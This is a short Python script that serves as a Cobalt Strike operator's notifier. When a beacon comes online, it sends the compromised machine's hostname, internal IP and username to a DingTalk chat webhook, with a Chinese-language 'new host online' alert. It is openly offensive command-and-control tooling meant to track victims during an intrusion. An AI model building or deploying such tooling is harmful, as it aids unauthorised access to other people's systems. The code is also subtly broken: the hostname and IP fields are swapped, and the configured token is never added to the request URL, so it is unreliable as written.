# encoding:utf-8
import argparse
import requests
import random
import string
import json

# Replace with your DingTalk webhook token
token = 'your token'

parser = argparse.ArgumentParser(description='Beacon Info')
parser.add_argument('--computername')
parser.add_argument('--internalip')
parser.add_argument('--username')
args = parser.parse_args()

internalip = args.internalip
computername = args.computername
username = args.username
ran_str = ''.join(random.sample(string.ascii_letters + string.digits, 8))

title = "CobaltStrike 上线提醒"
content = """
**您有新主机上线啦 ！**

**主机名: {}**

**IP: {}**

**用户名: {}**

**Token: {}**

**请注意查收哦 ~**
""".format(internalip, computername, username, ran_str)

url = 'https://oapi.dingtalk.com/robot/send?access_token='
data = {
    "at":{
        "isAtAll":"true"
    },
    "msgtype":"markdown",
    "markdown":{
                "text":content,
                "title":title
        }
}
body=json.dumps(data).encode(encoding='utf-8')
headers = {'Content-Type':'application/json'}
response = requests.post(url,data=body,headers=headers)
print(response.text)
